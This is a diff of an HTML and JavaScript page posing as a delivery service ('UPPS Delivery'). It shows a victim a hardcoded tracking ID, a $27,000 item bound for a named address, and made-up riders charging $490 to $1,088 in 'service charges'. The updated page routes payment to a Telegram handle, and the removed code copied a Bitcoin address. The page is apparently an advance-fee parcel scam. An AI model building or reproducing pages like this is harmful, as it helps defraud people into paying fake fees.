+                        <li>Click the <strong>"Pay Now"</strong> button below</li>
+                        <li>You will be directed to Telegram to complete payment</li>
+                        <li>Confirm your payment details with our agent</li>
+                        <li>Upload a screenshot of your payment confirmation</li>
+                        <li>Your delivery will be confirmed immediately</li>
+                    </ol>
+                </div>
+
+                <button class="btn btn-pay-now" onclick="proceedToPayment()">
+                    <i class="fas fa-money-bill-wave"></i> Pay Now
+                </button>
+
+                <p style="margin-top: 20px; font-size: 12px; color: #888;">
+                    <i class="fas fa-lock"></i> Your payment is secure and encrypted
+                </p>
             </div>
-        </section>
+        </div>
     </div>
 
-    <!-- Loading Overlay -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <div class="loading-text">
-            <p>CONFIRMING DELIVERY</p>
-            <p style="font-size: 0.8em; color: #888;">Charges will apply</p>
+    <!-- Order Confirmation Modal -->
+    <div id="confirmationModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2><i class="fas fa-check-circle"></i> Confirm Your Order</h2>
+                <p>Please review your delivery selection before confirming</p>
+            </div>
+
+            <div class="order-summary">
+                <div class="summary-item">
+                    <span class="label">Delivery To:</span>
+                    <span class="value">27 Kings Lane, Cape May Courthouse, NJ 08210</span>
+                </div>
+                <div class="summary-item">
+                    <span class="label">Item Value:</span>
+                    <span class="value">$27,000</span>
+                </div>
+                <div class="summary-item">
+                    <span class="label">Selected Rider:</span>
+                    <span class="value" id="selectedRiderName">-</span>
+                </div>
+                <div class="summary-item">
+                    <span class="label">Delivery Time:</span>
+                    <span class="value" id="selectedRiderTime">-</span>
+                </div>
+                <div class="summary-item">
+                    <span class="label" style="color: #ffc107;">Service Charge:</span>
+                    <span class="value" style="color: #ffc107; font-size: 20px;">$<span id="selectedRiderPrice">0</span></span>
+                </div>
+            </div>
+
+            <div style="background: rgba(255, 193, 7, 0.1); border: 1px solid #ffc107; border-radius: 10px; padding: 15px; margin-bottom: 20px;">
+                <p style="color: #ffc107; font-weight: 600; margin-bottom: 8px;">
+                    <i class="fas fa-exclamation-circle"></i> CHARGES WILL APPLY
+                </p>
+                <p style="color: #aaa; font-size: 13px;">
+                    The service charge shown above will be deducted upon payment confirmation.
+                </p>
+            </div>
+
+            <div class="modal-buttons">
+                <button class="btn btn-cancel" onclick="closeConfirmationModal()">
+                    <i class="fas fa-times"></i> Cancel
+                </button>
+                <button class="btn btn-primary" onclick="proceedToLoading()">
+                    <i class="fas fa-check"></i> Confirm
+                </button>
+            </div>
         </div>
+    </div>
+
+    <!-- Loading Modal -->
+    <div id="loadingModal" class="loading-modal">
+        <div class="loader"></div>
+        <div class="loading-text"><i class="fas fa-cog fa-spin"></i> CONFIRMING ORDER</div>
+        <div class="loading-note">BEFORE DELIVERY NOTE CHARGES WILL APPLY</div>
     </div>
 
     <!-- Success Modal -->
-    <div class="modal" id="successModal">
+    <div id="successModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <h2>Payment Confirmed</h2>
-                <button class="close-btn" onclick="closeSuccessModal()"><i class="fas fa-times"></i></button>
+                <h2 style="color: #39ff14;"><i class="fas fa-check-double"></i> Order Confirmed!</h2>
+                <p>Your delivery has been confirmed successfully</p>
             </div>
-            <div style="text-align: center;">
-                <div class="success-icon"><i class="fas fa-check-circle"></i></div>
-                <h3 style="color: var(--primary-green); margin-bottom: 15px;">Delivery Order Confirmed!</h3>
-                <p style="margin-bottom: 15px;">Your delivery has been successfully scheduled.</p>
-                <div style="background: var(--dark-bg); padding: 15px; border-radius: 8px; margin-bottom: 20px;">
-                    <p><strong>Track ID:</strong> <span style="color: var(--accent-green);">REG81993</span></p>
-                    <p><strong>Rider:</strong> <span id="finalRiderName" style="color: var(--accent-green);">-</span></p>
-                    <p><strong>Estimated Arrival:</strong> <span style="color: var(--accent-green);">2-4 Hours</span></p>
+
+            <div class="order-summary">
+                <div class="summary-item">
+                    <span class="label">Tracking ID:</span>
+                    <span class="value">REG81993</span>
                 </div>
-                <button class="button" onclick="resetForm()" style="width: 100%;"><i class="fas fa-home"></i> Back to Home</button>
+                <div class="summary-item">
+                    <span class="label">Status:</span>
+                    <span class="value" style="color: #39ff14;">Confirmed</span>
+                </div>
+                <div class="summary-item">
+                    <span class="label">Next Step:</span>
+                    <span class="value">Complete Payment</span>
+                </div>
             </div>
+
+            <button class="btn btn-primary" onclick="showPaymentSection()" style="width: 100%;">
+                <i class="fas fa-arrow-right"></i> Proceed to Payment
+            </button>
         </div>
     </div>
 
+    <!-- Footer -->
     <footer>
-        <p>&copy; 2026 ProDeliver - Premium Delivery Service. All rights reserved.</p>
-        <p>Professional Delivery Solutions | Secure Blockchain Payments | Real-time Tracking</p>
+        <p>&copy; 2026 UPPS Delivery. All rights reserved. | Professional Delivery Services</p>
+        <p style="font-size: 12px; margin-top: 10px;">Track with Precision. Deliver with Confidence.</p>
     </footer>
 
-    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDummyKeyForDemo"></script>
     <script>
+        // Riders Data
         const riders = [
-            { id: 1, name: "Marcus Elite", rating: 4.9, deliveries: 2847, time: "45 min", price: 490 },
-            { id: 2, name: "Sofia Express", rating: 4.8, deliveries: 2156, time: "50 min", price: 550 },
-            { id: 3, name: "Alex Pro", rating: 4.8, deliveries: 1934, time: "52 min", price: 620 },
-            { id: 4, name: "Jordan Fast", rating: 4.7, deliveries: 1756, time: "55 min", price: 710 },
-            { id: 5, name: "Casey Swift", rating: 4.7, deliveries: 1543, time: "58 min", price: 780 },
-            { id: 6, name: "Morgan Quick", rating: 4.6, deliveries: 1287, time: "60 min", price: 850 },
-            { id: 7, name: "Taylor Velocity", rating: 4.6, deliveries: 1098, time: "62 min", price: 925 },
-            { id: 8, name: "Riley Speed", rating: 4.5, deliveries: 876, time: "65 min", price: 1020 },
-            { id: 9, name: "Avery Rush", rating: 4.5, deliveries: 654, time: "68 min", price: 1080 },
-            { id: 10, name: "Jamie Supreme", rating: 4.9, deliveries: 3012, time: "40 min", price: 1088 }
+            {
+                id: 1,
+                name: "Alex Johnson",
+                rating: 4.9,
+                deliveries: 342,
+                time: "25-30 min",
+                price: 490,
+                vehicle: "Motorcycle"
+            },
+            {
+                id: 2,
+                name: "Maria Garcia",
+                rating: 4.8,
+                deliveries: 298,
+                time: "30-35 min",
+                price: 550,
+                vehicle: "Car"
+            },
+            {
+                id: 3,
+                name: "James Wilson",
+                rating: 5.0,
+                deliveries: 456,
+                time: "20-25 min",
+                price: 620,
+                vehicle: "Motorcycle"
+            },
+            {
+                id: 4,
+                name: "Emma Davis",
+                rating: 4.7,
+                deliveries: 289,
+                time: "35-40 min",
+                price: 710,
+                vehicle: "Truck"
+            },
+            {
+                id: 5,
+                name: "Michael Brown",
+                rating: 4.9,
+                deliveries: 378,
+                time: "28-32 min",
+                price: 780,
+                vehicle: "Car"
+            },
+            {
+                id: 6,
+                name: "Sofia Martinez",
+                rating: 4.8,
+                deliveries: 315,
+                time: "32-37 min",
+                price: 850,
+                vehicle: "Van"
+            },
+            {
+                id: 7,
+                name: "David Anderson",
+                rating: 4.9,
+                deliveries: 401,
+                time: "22-27 min",
+                price: 925,
+                vehicle: "Motorcycle"
+            },
+            {
+                id: 8,
+                name: "Lisa Thomas",
+                rating: 4.8,
+                deliveries: 267,
+                time: "38-43 min",
+                price: 1020,
+                vehicle: "Truck"
+            },
+            {
+                id: 9,
+                name: "Chris Lee",
+                rating: 4.9,
+                deliveries: 389,
+                time: "24-29 min",
+                price: 1080,
+                vehicle: "Car"
+            },
+            {
+                id: 10,
+                name: "Sarah White",
+                rating: 5.0,
+                deliveries: 512,
+                time: "18-23 min",
+                price: 1088,
+                vehicle: "Motorcycle"
+            }
         ];
 
         let selectedRider = null;
 
-        function initMap() {
-            const mapElement = document.getElementById('map');
-            if (!mapElement) return;
-
-            const destination = { lat: 39.0661, lng: -74.8099 };
-            const map = new google.maps.Map(mapElement, {
-                zoom: 8,
-                center: destination,
-                styles: [
-                    { elementType: "geometry", stylers: [{ color: "#1a1a1a" }] },
-                    { elementType: "labels.text.stroke", stylers: [{ color: "#1a1a1a" }] },
-                    { elementType: "labels.text.fill", stylers: [{ color: "#757575" }] },
-                    { featureType: "road", elementType: "geometry", stylers: [{ color: "#383838" }] },
-                    { featureType: "road", elementType: "geometry.stroke", stylers: [{ color: "#212121" }] },
-                    { featureType: "water", elementType: "geometry", stylers: [{ color: "#000000" }] }
-                ]
-            });
-
-            // Airport marker (origin)
-            const airportMarker = new google.maps.Marker({
-                position: { lat: 39.1753, lng: -74.7597 },
-                map: map,
-                title: "Origin: Atlantic City International Airport",
-                icon: "http://maps.google.com/mapfiles/ms/icons/blue-dot.png"
-            });
-
-            // Destination marker
-            const destinationMarker = new google.maps.Marker({
-                position: destination,
-                map: map,
-                title: "Destination: 27 Kings Lane, Cape May Courthouse",
-                icon: "http://maps.google.com/mapfiles/ms/icons/green-dot.png"
-            });
-
-            // Route line
-            const route = new google.maps.Polyline({
-                path: [
-                    { lat: 39.1753, lng: -74.7597 },
-                    { lat: 39.1400, lng: -74.7800 },
-                    { lat: 39.0661, lng: -74.8099 }
-                ],
-                geodesic: true,
-                strokeColor: "#00d084",
-                strokeOpacity: 0.8,
-                strokeWeight: 3,
-                map: map
-            });
+        // Verify Tracking ID
+        function verifyTracking() {
+            const trackingInput = document.getElementById('trackingInput').value.trim().toUpperCase();
+            
+            if (trackingInput === 'REG81993') {
+                document.getElementById('hiddenContent').classList.add('active');
+                renderRiders();
+                document.getElementById('trackingInput').value = '';
+                scrollToRiders();
+            } else {
+                alert('Invalid Tracking ID. Please enter: REG81993');
+            }
         }
 
+        // Allow Enter key
+        document.getElementById('trackingInput')?.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verifyTracking();
+            }
+        });
+
+        // Render Riders
         function renderRiders() {
-            const ridersGrid = document.getElementById('ridersGrid');
-            ridersGrid.innerHTML = '';
+            const container = document.getElementById('ridersContainer');
+            container.innerHTML = '';
 
             riders.forEach(rider => {
                 const riderCard = document.createElement('div');
                 riderCard.className = 'rider-card';
-                riderCard.id = `rider-${rider.id}`;
                 riderCard.innerHTML = `
-                    <label style="cursor: pointer; display: block;">
-                        <input type="radio" name="rider" value="${rider.id}" onchange="selectRider(${rider.id})">
-                        
-                        <div class="rider-header">
-                            <div class="rider-avatar"><i class="fas fa-user"></i></div>
-                            <div class="rider-info">
-                                <h3>${rider.name}</h3>
-                                <p><i class="fas fa-star" style="color: #ffd700;"></i> ${rider.rating} • ${rider.deliveries} deliveries</p>
+                    <div class="rider-header">
+                        <div class="rider-avatar">${rider.name.split(' ').map(n => n[0]).join('')}</div>
+                        <div class="rider-info">
+                            <h3>${rider.name}</h3>
+                            <div class="rider-rating">
+                                <span class="stars"><i class="fas fa-star"></i> ${rider.rating}</span>
+                                <span>(${rider.deliveries} deliveries)</span>
                             </div>
                         </div>
-
-                        <div class="rider-details">
-                            <div class="detail-item">
-                                <i class="fas fa-clock"></i>
-                                <p>${rider.time}</p>
-                                <span>Estimated</span>
-                            </div>
-                            <div class="detail-item">
-                                <i class="fas fa-rocket"></i>
-                                <p>Priority</p>
-                                <span>Service</span>
-                            </div>
-                            <div class="detail-item">
-                                <i class="fas fa-phone"></i>
-                                <p>24/7</p>
-                                <span>Support</span>
-                            </div>
+                    </div>
+                    <div class="rider-details">
+                        <div class="detail-item">
+                            <span class="label">Time</span>
+                            <span class="value">${rider.time}</span>
                         </div>
-
-                        <div style="text-align: right;">
-                            <span class="rider-price">$${rider.price}</span>
-                            <p style="color: #888; font-size: 0.9em; margin: 5px 0 0 0;">delivery fee</p>
+                        <div class="detail-item">
+                            <span class="label">Vehicle</span>
+                            <span class="value">${rider.vehicle}</span>
                         </div>
-                    </label>
+                    </div>
+                    <div class="rider-price">
+                        <div class="price">$${rider.price}</div>
+                        <div class="price-label">Service Charge</div>
+                    </div>
                 `;
-                ridersGrid.appendChild(riderCard);
+                riderCard.onclick = () => selectRider(rider, riderCard);
+                container.appendChild(riderCard);
             });
-
-            // Load map
-            setTimeout(initMap, 500);
         }
 
-        function selectRider(riderId) {
-            selectedRider = riders.find(r => r.id === riderId);
-            
-            // Update UI
+        // Select Rider
+        function selectRider(rider, element) {
             document.querySelectorAll('.rider-card').forEach(card => {
                 card.classList.remove('selected');
             });
-            document.getElementById(`rider-${riderId}`).classList.add('selected');
-
-            // Show confirmation section
-            document.getElementById('confirmationSection').classList.add('active');
-
-            // Update confirmation details
-            document.getElementById('confirmRider').textContent = selectedRider.name;
-            document.getElementById('confirmCharge').textContent = `$${selectedRider.price}`;
-            document.getElementById('confirmTotal').textContent = `$${selectedRider.price}`;
-            document.getElementById('confirmTime').textContent = selectedRider.time;
-
-            // Scroll to confirmation
+            element.classList.add('selected');
+            selectedRider = rider;
+            
             setTimeout(() => {
-                document.getElementById('confirmationSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
+                openConfirmationModal();
             }, 300);
         }
 
-        function proceedToPayment() {
-            if (!selectedRider) {
-                alert('Please select a rider first');
-                return;
-            }
+        // Open Confirmation Modal
+        function openConfirmationModal() {
+            if (!selectedRider) return;
+            
+            document.getElementById('selectedRiderName').textContent = selectedRider.name;
+            document.getElementById('selectedRiderTime').textContent = selectedRider.time;
+            document.getElementById('selectedRiderPrice').textContent = selectedRider.price;
+            
+            document.getElementById('confirmationModal').classList.add('active');
+        }
 
-            // Show loading overlay
-            const loadingOverlay = document.getElementById('loadingOverlay');
-            loadingOverlay.classList.add('active');
+        // Close Confirmation Modal
+        function closeConfirmationModal() {
+            document.getElementById('confirmationModal').classList.remove('active');
+            document.querySelectorAll('.rider-card').forEach(card => {
+                card.classList.remove('selected');
+            });
+            selectedRider = null;
+        }
 
-            // 4-second loading animation
+        // Proceed to Loading
+        function proceedToLoading() {
+            document.getElementById('confirmationModal').classList.remove('active');
+            document.getElementById('loadingModal').classList.add('active');
+            
             setTimeout(() => {
-                loadingOverlay.classList.remove('active');
-                
-                // Hide confirmation, show payment
-                document.getElementById('confirmationSection').classList.remove('active');
-                document.getElementById('paymentSection').classList.add('active');
-
-                // Scroll to payment
-                document.getElementById('paymentSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
+                document.getElementById('loadingModal').classList.remove('active');
+                document.getElementById('successModal').classList.add('active');
             }, 4000);
         }
 
-        function completePayment() {
-            document.getElementById('finalRiderName').textContent = selectedRider.name;
-            document.getElementById('successModal').classList.add('active');
-        }
-
-        function cancelConfirmation() {
-            document.getElementById('confirmationSection').classList.remove('active');
-            document.querySelectorAll('.rider-card').forEach(card => {
-                card.classList.remove('selected');
-            });
-            document.querySelectorAll('input[name="rider"]').forEach(input => {
-                input.checked = false;
-            });
-            selectedRider = null;
-        }
-
-        function backToConfirmation() {
-            document.getElementById('paymentSection').classList.remove('active');
-            document.getElementById('confirmationSection').classList.add('active');
-            document.getElementById('confirmationSection').scrollIntoView({ behavior: 'smooth', block: 'start' });
-        }
-
-        function copyBTCAddress() {
-            const address = 'bc1q7a3z4fma46nvz08r7xcp5u83ksuwz9a0mfce0h';
-            navigator.clipboard.writeText(address).then(() => {
-                alert('Bitcoin address copied to clipboard!');
-            });
-        }
-
-        function closeSuccessModal() {
+        // Show Payment Section
+        function showPaymentSection() {
             document.getElementById('successModal').classList.remove('active');
-            resetForm();
+            document.getElementById('paymentSection').style.display = 'block';
+            scrollToPayment();
         }
 
-        function resetForm() {
-            document.getElementById('successModal').classList.remove('active');
-            document.getElementById('paymentSection').classList.remove('active');
-            document.getElementById('confirmationSection').classList.remove('active');
-            document.querySelectorAll('input[name="rider"]').forEach(input => {
-                input.checked = false;
-            });
-            document.querySelectorAll('.rider-card').forEach(card => {
-                card.classList.remove('selected');
-            });
-            selectedRider = null;
-            window.scrollTo({ top: 0, behavior: 'smooth' });
+        // Proceed to Payment
+        function proceedToPayment() {
+            window.open('https://t.me/AGGRESSIVE_POWER1', '_blank');
         }
 
-        // Initialize on page load
-        document.addEventListener('DOMContentLoaded', renderRiders);
+        // Scroll Functions
+        function scrollToRiders() {
+            document.querySelector('.riders-section').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        function scrollToPayment() {
+            document.querySelector('.payment-section').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Close modals on outside click
+        window.onclick = function(event) {
+            const confirmModal = document.getElementById('confirmationModal');
+            const successModal = document.getElementById('successModal');
+            
+            if (event.target === confirmModal) {
+                closeConfirmationModal();
+            }
+            if (event.target === successModal) {
+                successModal.classList.remove('active');
+            }
+        }
     </script>
 </body>
 </html>
